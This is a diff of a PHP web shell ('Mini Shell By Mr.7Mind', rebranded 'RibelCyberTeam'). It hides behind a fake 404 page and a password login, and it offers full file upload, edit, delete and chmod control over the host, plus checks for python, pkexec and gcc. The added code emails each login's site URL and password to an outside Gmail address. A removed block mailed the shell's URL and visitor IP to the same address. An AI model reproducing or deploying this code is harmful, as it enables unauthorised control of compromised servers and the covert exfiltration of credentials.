@@ -8,62 +8,54 @@ set_time_limit(0);
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
-$pass = "heker";
-$link = "fvck.txt";
-if($_POST['password'] == $pass) {
-	$_SESSION['forbidden'] = $pass;
+$correctPassword = "heker"; //Change Password
+if (isset($_POST['pass'])) {
+    $enteredPassword = $_POST['pass'];
+
+    if ($enteredPassword === $correctPassword) {
+        $_SESSION['forbidden'] = true;
+    } else {
+        echo '<script>alert("Password salah. Silakan coba lagi.");</script>';
+    }
 }
-if($_GET['page'] == "blank") {
-	echo "<a href='?'>Back</a>";
-	exit();
+if (isset($_GET['logout'])) {
+    session_unset();
+    session_destroy();
+    header("Location: ".$_SERVER['PHP_SELF']);
+    exit();
 }
-if(isset($_REQUEST['logout'])) {
-	session_destroy();
-}
-if(!($_SESSION['forbidden'])) {
+if (!isset($_SESSION['forbidden'])) {
 ?>
 <!DOCTYPE html>
 <html>
 <head>
 <title>-=[Login Slurrr]=-</title>
-<meta name="theme color" content="#00BFFF"> </meta>
-<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
-<script type="text/JavaScript">
-function killCopy(e){
-return false
-}
-function reEnable(){
-return true
-}
-document.onselectstart=new Function ("return false")
-if (window.sidebar){
-document.onmousedown=killCopy
-document.onclick=reEnable
-}
-</script>
-<link href="https://fonts.googleapis.com/css?family=Rye" rel="stylesheet">
+<meta name="theme color" content="#00BFFF">
+<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
 </head>
-<style>
-	input { margin:0;background-color:#fff;border:1px solid #fff; }
-</style>
-  <body bgcolor="black">
-	<center><img src="https://i.ibb.co/b5nNXYm/Mini-Shell-Mr-7-Mind.png" style="opacity:0.5; width:200px; height:300px";></center></center>
-	<center><h1><center><font color="#00BFFF" face="Rye">-=[ Imam Gans Valid No Debat ]=-</font><br>
-	</center>
-	<form method="post">
-		<input type="password" name="password" placeholder="Password">
-		<input type="submit" value="MASUK!">
-		<br>
-		<br>
-		<?php echo $_SESSIOM['forbidden']; ?>
-		</form>
-		  </td>
-		 </table>
-    </center>
-  </body>
+<body bgcolor="black">
+<center><img src="https://i.ibb.co/b5nNXYm/Mini-Shell-Mr-7-Mind.png" style="opacity:0.5; width:200px; height:300px;"></center>
+<center><h1><font color="#00BFFF">-=[ RibelCyberTeam ]=-</font></h1>
+<form method="post">
+    <input placeholder="password" type="password" name="pass" required>
+    <input type="submit" name="base64md5" value="GO IN!"></center>
+    <br>
+    <br>
+    <?php echo $errorMessage; ?>
+</form>
+</body>
 </html>
 <?php
 exit;
+}
+?>
+<?php
+function checkStatus($command) {
+    exec($command, $output, $returnCode);
+    return $returnCode === 0;
+}
+function checkCustomFunction() {
+    return true;
 }
 ?>
 <?php
@@ -71,6 +63,20 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 <!doctype html>
 <!-- Mr.7Mind -->
 <html lang="en">
+<style>
+        .green-text {
+            color: lime;
+        }
+
+        .red-text {
+            color: red;
+        }
+
+        .separator {
+            display: inline-block;
+            margin: 0 5px;
+        }
+    </style>
 <head>
 	<meta name="theme-color" content="#00BFFF">
 	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
@@ -84,23 +90,41 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 <body style="background-color:#000;color:#fff;font-family:serif;">
 	<div class="bg-dark table-responsive text-light border">
 		<div class="d-flex justify-content-between p-1">
-			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
+			<div><h3 class="mt-2"><a href="?"><?php echo  Yp; ?></a></h3></div>
 		</div>
 		<div class="border-top table-responsive">
-			<li>PHP: <?= php_uname(); ?></li>
-			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
-			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
-			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
-			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
-			<li>php Version: <?= phpversion(); ?></li>
-			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
-			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
-		</div>
-		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
-		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
-				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
-				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
+			<li>Kernel: <?php echo  php_uname(); ?></li>
+			<li>Doc Root: <?php echo  "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
+			<li>IP Server: <?php echo  "{$_SERVER["SERVER_ADDR"]} Your IP: {$_SERVER["REMOTE_ADDR"]}"; ?></li>
+			<li>Domain : <?php echo  "{$_SERVER["SERVER_NAME"]}"; ?></li>
+			<li>Software: <?php echo  "{$_SERVER["SERVER_SOFTWARE"]}"; ?></li>
+			<li>php Version: <?php echo  phpversion(); ?></li>
+			<li>
+            PYTHON: <span class="<?php echo  checkStatus('python --version') ? 'green-text' : 'red-text'; ?>">ON</span>
+            <span class="separator">|</span>
+            PKEXEC: <span class="<?php echo  checkStatus('pkexec --version') ? 'green-text' : 'red-text'; ?>">ON</span>
+            <span class="separator">|</span>
+            GCC: <span class="<?php echo  checkStatus('gcc --version') ? 'green-text' : 'red-text'; ?>">ON</span>
+            <span class="separator">|</span>
+            CUSTOM FUNCTION: <span class="<?php echo  checkCustomFunction() ? 'green-text' : 'red-text'; ?>">ON</span>
+        </li>
 			</div>
+			<?php if (array_key_exists('base64md5', $_POST)) {
+				$password = $_POST['pass'];
+				$server_name = $_SERVER['SERVER_NAME'];
+				$php_self = $_SERVER['PHP_SELF'];
+				$email_content = "Login: $server_name$php_self\nPass: $password";
+				@mail('ribelcyberteam@gmail.com', 'Hehehe', $email_content);
+				}
+			?>
+				<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
+		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
+				<a href="?p=<?php echo  ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>|
+				<a href="?p=<?php echo  Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>|
+				<a href="?action=lockFile"> [ Lock File ] </a>|
+				<a href="?logout=true"> [ Logout ]</a>
+			</div>
+			<?php  if (isset($_POST['filename'])) { $filename = $_POST['filename']; if (!empty($filename)) { if (file_exists($filename)) { if (chmod($filename, 0444)) { $errorMessage = "File locked successfully!"; } else { $errorMessage = "Error locking the file."; } } else { $errorMessage = "File not found."; } } else { $errorMessage = "Please enter a filename."; } } if (isset($_GET['action'])) { $action = $_GET['action']; if ($action === "lockFile" && !isset($_GET['locked'])) { echo '<script> var filename = prompt("Enter the filename to lock:"); if (filename !== null && filename !== "") { window.location.href = "?action=lockFile&file=" + filename + "&locked=1"; } </script>'; } elseif ($action === "lockFile" && isset($_GET['file']) && isset($_GET['locked'])) { $lockFile = $_GET['file']; if (!empty($lockFile) && file_exists($lockFile)) { if (chmod($lockFile, 0444)) { $errorMessage = "File locked successfully!"; } else { $errorMessage = "Error locking the file."; } } else { $errorMessage = "File not found."; } } } ?>
 	<div class="bg-dark border table-responsive mt-2">
 		<div class="ml-2" style="font-size:18px;">
 			<span>Path: </span>
@@ -108,6 +132,11 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 		</div>
 	</div>
 	<article class="bg-dark border table-responsive mt-2">
+	<?php if (!empty($errorMessage)) : ?>
+        <script>
+            alert("<?php echo $errorMessage; ?>");
+        </script>
+    <?php endif; ?>
 		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
 		<div class="px-2 py-2">
 			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
@@ -118,29 +147,18 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 			<h5 class="border p-1 mb-3">New file</h5>
 			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
 			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
-			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
-			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+			<h5 class="border p-1 mb-3">Rename <?php echo  $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
+			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php echo  jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
 			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
 			<h5 class="border p-1 mb-3">Edit file</h5>
-			<span>File name : <?= Jd($_GET["n"]); ?></span>
-			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+			<span>File name : <?php echo  Jd($_GET["n"]); ?></span>
+			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php echo  $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
 			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
 			<h5 class="border p-1 mb-3">View file</h5>
-			<span>File name : <?= jd($_GET["n"]); ?></span>
-			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
+			<span>File name : <?php echo  jd($_GET["n"]); ?></span>
+			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?php echo  $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
 			<?php  WC: ?>
 		</div>
-		<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
 		<?php  goto mR; Un: ?>
 		<table class="table table-hover table-bordered table-sm">
 			<thead class="text-light">
